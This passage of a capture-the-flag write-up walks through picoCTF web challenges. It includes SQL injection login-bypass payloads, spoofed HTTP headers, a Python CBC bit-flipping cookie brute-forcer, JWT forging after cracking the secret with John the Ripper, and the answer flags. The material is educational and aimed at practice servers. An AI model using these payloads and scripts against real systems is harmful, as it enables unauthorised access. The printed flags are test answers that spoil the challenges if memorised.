This file is highly obfuscated and extremely hard to read on browser.

So, i asked chatgpt to make the code readable. Much better.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*jiMtXxwhNM-7wyZeoFyV5w.png)

Noticed a long array at the top (like `const _0x402c = [...]`) and a weird function like:

<pre>
const _0x4e0e = function(_a, _b) { ... }
</pre>

From its logic, it maps indices to values in the array.  
I renamed things like:

*   `_0x402c` → `initialArray`
*   `_0x4e0e` → `getArrayVal`

Also found a self-invoking function that keeps shifting the array until some condition is met. That’s just to obfuscate the real strings.

> _TLDR: This chunk is meant to decode the array and get readable strings like_ `_"Incorrect!"_`_,_ `_"check_flag"_`_, etc._

**Step 3: Focus on the Flag Check Logic**  
Towards the end of the JS, found code bound to the submit button:

<pre>
document.getElementById('submit').onclick = function() {  
  ...  
  instance.exports.check_flag(input);  
}
</pre>

Here:

*   The `instance.exports` is coming from a WebAssembly (WASM) file.
*   The WASM file is fetched from `/JIFxzHyW8W`.

**Step 4: Download and Analyze WASM File**  
Downloaded the file from ``[http://mercury.picoctf.net:1896/JIFxzHyW8W]``(http://mercury.picoctf.net:1896/JIFxzHyW8W)

Then ran:
<pre>
file JIFxzHyW8W
</pre>
Output:
<pre>
WebAssembly (wasm) binary module version 0x1
</pre>
Now we know the logic of flag checking is inside this WASM binary.

**Step 5: Extract Flag from WASM**  
Instead of reverse engineering WASM bytecode, used:

<pre>
strings JIFxzHyW8W | grep pico
</pre>

Found the flag inside the binary as a string.

> picoCTF{d88090e679c48f3945fcaa6a7d6d70c5}

**27\. Who are you?**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*i-0XafUN4y42GW4j8Ff1iw.png)

We land on a page that says:

> _“Only official_ **_picobrowser_** _members are allowed.”_

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*MP7ULCUN9G5xPSKPp8Ap7g.png)

Hmm 🤔 Let’s play with **HTTP headers** using Burp Suite.

**User-Agent**  
Set to: `picobrowser`

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*NpQNrz5pkPEOkmdu_ucZ9Q.png)

➝ New message: _“We don’t trust users visiting from another site.”_

**Referer**  
Add: `mercury.picoctf.net:1270`

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*MWXMhYLUDl6-7EJcYkufrw.png)

➝ New message: _“This site only worked in 2018.”_

**Date**  
Set to 2018

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*jBavrLmt1UkALDLTJFx3wg.png)

➝ New message: _“I don’t trust users who can be tracked.”_

**DNT (Do Not Track)**  
Add: `DNT: 1`

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*20Z5T52pBbx8eHSxawb80g.png)

➝ New message: _“This website is only for people from Sweden.”_

**X-Forwarded-For**  
Spoof a Swedish IP: `X-Forwarded-For: 192.121.0.1`

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ECODEocE_HvU_yOyQMaTUA.png)

➝ New message: _“You don’t speak Swedish!”_

**Accept-Language**  
Set to: `sv`

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ef_8WD9odMG6Fagb9bhxWQ.png)

➝ Boom! Got the flag.

> picoCTF{http\_h34d3rs\_v3ry\_c0Ol\_much\_w0w\_f56f58a5}

**28\. Some Assembly Required 2**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*JUW6adj7RySnnmivAZMxag.png)

Just like in **Part 1**, I opened the page and found an obfuscated JS file: _Y8splx37qY.js_

I threw it into [jsnice.org](http://jsnice.org/) to prettify it a bit.

Then ran `strings` on the file locally, and towards the bottom among the WebAssembly gibberish, I spotted this weird line:

<pre>
+xakgK\Nsmn;j8j<9;<?=l?k88mm1n9i1j>:8k?l0u
</pre>

Looked suspiciously like **obfuscated data** — maybe even the flag.

Eventually, I suspected **XOR encoding**, so I jumped into [CyberChef](https://gchq.github.io/CyberChef/) and used the:

> _🔧_ **_XOR Brute Force_** _recipe (range 1–100)_

Input:

<pre>
xakgK\Nsmn;j8j<9;<?=l?k88mm1n9i1j>:8k?l0u
</pre>

And boom 💥 — it was XORed with `0x08`.

> picoCTF{ef3b0b413475d7c00ee9f1a9b620c7d8}

**29\. Web Gauntlet 3**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*m9pi2Hg9oPH7bSKHn1Ficg.png)

We’re given a familiar login form and a `filter.php` file that blocks specific keywords.

Since this looks just like **Web Gauntlet 2**, I reused the same SQL injection bypass:

*   **Username**: `ad'||'min`
*   **Password**: `a' IS NOT 'b`

This worked again! 🏁

We get a message saying:

> _“you won. check out filter.php”_

So I opened `/filter.php`, and there was the flag:

> picoCTF{k3ep\_1t\_sh0rt\_30593712914d76105748604617f4006a}

**30\. More Cookies**
----

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*X8ScGOFOYtL0WlB25-6C8Q.png)

On the page, we’re told **only admin can access the cookie search page**. So I checked the browser cookies and noticed something interesting:

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*cHcYFHvwvm5fvlpBr5p8Pg.png)

There’s an `auth_name` cookie that looks Base64-encoded.

I decoded it using CyberChef, but it still appeared to be gibberish — not a straightforward encoding.

The challenge gave two subtle hints:

*   A reference to [Homomorphic encryption](https://en.wikipedia.org/wiki/Homomorphic_encryption) — possibly a red herring.
*   But more importantly, the letters **“CBC”** were strangely capitalized in the description.

This strongly suggested a **CBC Bitflipping Attack**.

In CBC mode, modifying bits in the ciphertext block can flip bits in the corresponding plaintext of the **next block**. So even though we can’t decrypt the cookie directly, we can manipulate it to change values like:

<pre>
admin=False  ⟶  admin=True
</pre>

…but without knowing where that string lives, I brute-forced all possible positions and flipped each bit:

<pre>
from base64 import b64decode, b64encode
import requests

original_cookie_b64 = "ODYxcFl1OVRUU3l0NTdyWkFJZ1luTndHS2ZLSk5zTG5Hd3NjNFJOTit0Zy9jRDRyZTlZajRkclFqQmVRQTlTdnJlS1NoTVV2MjVHa29lQmJ6TUg3S0NtVnE3by9wMWFPa28xMGZlZDllYThDNEFvaUMrYWlRQUV0NFVZaGF4Ky8="
original_cookie = bytearray(b64decode(original_cookie_b64))

url = 'http://mercury.picoctf.net:56136/'

def bitFlip(cookie_char_pos: int, bit_pos: int) -> str:
    altered_cookie = bytearray(original_cookie)
    altered_cookie[cookie_char_pos] ^= bit_pos
    altered_cookie_b64 = b64encode(altered_cookie)
    return altered_cookie_b64.decode('utf-8')

for cookie_char_pos in range(len(original_cookie)):
    print(f"[+] Checking cookie position: {cookie_char_pos}")
    for bit_pos in range(1, 128): 
        altered_cookie = bitFlip(cookie_char_pos, bit_pos)
        cookies = {'auth_name': altered_cookie}
        try:
            r = requests.get(url, cookies=cookies, timeout=5)
            t = r.text.lower()
            if "picoctf{" in t:
                print("[!] Flag found!")
                print(r.text)
                exit(0)
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error: {e}")

print("[X] Finished searching, no flag found.")
</pre>

The script worked — it flipped just the right bit and gave me:

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*U1mLdHhZUwcVth6rDU_JmQ.png)

> picoCTF{cO0ki3s\_yum\_e491c430}

**31\. It is my Birthday**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*acn-h8qjBErkB_tgpkz2Xw.png)

Got a web page with an option to upload **two documents**.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*BLp6nMnPNjhc9tQAWnmFJw.png)

The prompt hints: _“Two files that look similar and have the same md5 hash.”_  
Sounds like… **MD5 collision**

Googled and landed here: [md5collision files](https://www.mscs.dal.ca/~selinger/md5collision/)

Downloaded `erase` and `hello`. Renamed them to `erase.pdf` and `hello.pdf`(just added `.pdf` extension). Uploaded both…

Boom — it worked. Got the flag:

> picoCTF{c0ngr4ts\_u\_r\_1nv1t3d\_aad886b9}

**32\. Web Gauntlet**
----

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*fK-qpZjTvXNIR9FsgjftbA.png)

We actually did **Web Gauntlet 2 & 3 first** 😅 So this one felt like the prequel. There are **5 rounds**, and after each successful login, `filter.php` gets updated with more restrictions.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*wWPUZJVAQQq1BPfkSsEHcA.png)

![filter.php](https://miro.medium.com/v2/resize:fit:204/format:webp/1*K39u6N4C--WEqc_cdDaShA.png)

**Round 1**

Filtered: `or`  
Payload: `admin'--`  
Logged in.

**Round 2**

Filtered: `or, and, like, =, --`  
Used a classic bypass: `admin' /*`  
Success.

**Round 3**

Filtered: `or, and, =, like, >, <, -`  
Just tried: `admin';`  
Yep.

**Round 4**

Filtered: `or,and,like,=,--,>,<,admin`  
`ad'||'min';` worked.  
Logged in again.

**Round 5**

Filtered: `or, and, =, like, >, <, -, union, admin`  
`ad'||'min';` still passes

After all 5 rounds, visited `filter.php` and found the flag:

> picoCTF{y0u\_m4d3\_1t\_cab35b843fdd6bd889f76566c6279114}

**33\. Irish-Name-Repo 1**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*6Ny_tkGCegF8A6MrqhDboA.png)

Landed on a login page.  
**View Source** revealed a hidden input:

<pre>
<input type="hidden" name="debug" value="0">
</pre>

Changed it to `1` — let's see what happens. Maybe it unlocks a **debug bypass**?

Tried a classic payload:

<pre>
' OR 1=1; --
</pre>

Logged in instantly.

> picoCTF{s0m3\_SQL\_fb3fe2ad}

**34\. Client-side-again**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*Lg5spOki8q7P8tMJtWV1pA.png)

Opened the webpage. Nothing fancy — but the **source code** had a block of obfuscated JavaScript.

<pre>
  var _0x5a46=['0a029}','_again_5','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this'];(function(_0x4bd822,_0x2bd6f7){var _0xb4bdb3=function(_0x1d68f6){while(--_0x1d68f6){_0x4bd822['push'](_0x4bd822['shift']());}};_0xb4bdb3(++_0x2bd6f7);}(_0x5a46,0x1b3));var _0x4b5b=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x5a46[_0x2d8f05];return _0x4d74cb;};function verify(){checkpass=document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];split=0x4;if(checkpass[_0x4b5b('0x2')](0x0,split*0x2)==_0x4b5b('0x3')){if(checkpass[_0x4b5b('0x2')](0x7,0x9)=='{n'){if(checkpass[_0x4b5b('0x2')](split*0x2,split*0x2*0x2)==_0x4b5b('0x4')){if(checkpass[_0x4b5b('0x2')](0x3,0x6)=='oCT'){if(checkpass[_0x4b5b('0x2')](split*0x3*0x2,split*0x4*0x2)==_0x4b5b('0x5')){if(checkpass['substring'](0x6,0xb)=='F{not'){if(checkpass[_0x4b5b('0x2')](split*0x2*0x2,split*0x3*0x2)==_0x4b5b('0x6')){if(checkpass[_0x4b5b('0x2')](0xc,0x10)==_0x4b5b('0x7')){alert(_0x4b5b('0x8'));}}}}}}}}else{alert(_0x4b5b('0x9'));}}
</pre>

Deobfuscated it and found a sequence of checks using `.substring()` — classic hardcoded flag logic.

<pre>
function verify() {
    checkpass = document['getElementById']('pass')['value'];
    split = 4;

    if (checkpass.substring(0, 8) == 'picoCTF{') {
        if (checkpass.substring(7, 9) == '{n') {
            if (checkpass.substring(8, 16) == 'not_this') {
                if (checkpass.substring(3, 6) == 'oCT') {
                    if (checkpass.substring(24, 32) == '0a029}') {
                        if (checkpass.substring(6, 11) == 'F{not') {
                            if (checkpass.substring(16, 24) == '_again_5') {
                                if (checkpass.substring(12, 16) == 'this') {
                                    alert('Password Verified');
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert('Incorrect password');
    }
}
</pre>

Based on those checks, the password is:

> picoCTF{not\_this\_again\_50a029}

**35\. Irish-Name-Repo 2**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZuZM0szX0_rPFnr3K3eAog.png)

Continuation of **irish-name-repo 1** — this time likely with **SQLi detection** in place.

Tried: `Username: admin'--` and logged in successfuly.

> picoCTF{m0R3\_SQL\_plz\_aee925db}

**36\. JaWT Scratchpad**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*GQy2wf6kBp9wL3t7vSMgjw.png)

An online scratchpad that gives a **JWT token** in cookies after entering any username. But “**admin**” is restricted.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*7W9VMHGIHNcaBHT9nZSvWg.png)

*   Enter some random username.
*   Check cookies → JWT found.

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*fzE5jmhZBd5vpn932ATuEA.png)

*   Decode it on [jwt.io](https://jwt.io).

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*5-IUYFPEIxmGRDM16XdLmg.png)

*   Change `"user"` to `"admin"` — but it's signed with **HS256**, so we need the secret.

The page hints **John** → yep, **John the Ripper** + `rockyou.txt`.

<pre>
john token.txt --wordlist=rockyou.txt
</pre>

Found secret: `ilovepico`

Now:

*   Go back to jwt.io
*   Payload:`{ "user": "admin" }`
*   Secret: `ilovepico`
*   Copy the new signed token
*   Replace in browser cookies

And boom 💥 — we’re **admin**.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*IwkPqruoPZvug6bBlJbJfQ.png)

> picoCTF{jawt\_was\_just\_what\_you\_thought\_1ca14548}

**37\. picobrowser**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*jVUuTAxPxwgM1IQl6BgJrw.png)

A website with just a **“Get Flag”** button.

But clicking it? Nothing special.

Let’s intercept it with **Burp Suite**

1.  Click the button
2.  Intercept the request in **BurpSuite**
3.  Modify the `User-Agent` header to:

<pre>
User-Agent: picobrowser
</pre>

4. Forward the request

Flag appears!

> picoCTF{p1c0\_s3cr3t\_ag3nt\_84f9c865}

**38\. Irish-Name-Repo 3**
----

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*8K7uSD5LqlDvJ5PL4pASGA.png)

Looks familiar? Just like **Part 2**…

1.  Visit the **admin login** page
2.  View source — there’s a **hidden field**: `<input type="hidden" name="debug" value="0" />`
3.  Change `debug` to `1` using DevTools
4.  Try basic SQLi:`' or 1 = 1; --`

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*r0QcsxLSNG7_FJmBFCX9GA.png)

5. Huh? `or` becomes `be`  
ROT13 detected!

6. Use: `' be 1 = 1; --`

Logged in as **admin**.

> picoCTF{3v3n\_m0r3\_SQL\_7f5767f6}

---

Every challenge started with curiosity — a login form, a cookie, a hidden input, or a strange script. But with a little digging, decoding, and the right mindset, each turned into a small win. These weren’t just flags; they were lessons in how the web works, how it breaks, and how to think like an attacker.

This was never about being the best — just better than yesterday.

📝 You can also check out more of my writeups here: [github.com/Bl0ss0mX5](https://github.com/Bl0ss0mX5) and [medium.com/@bl0ss0mx5](https://medium.com/@bl0ss0mx5)

On to the next box.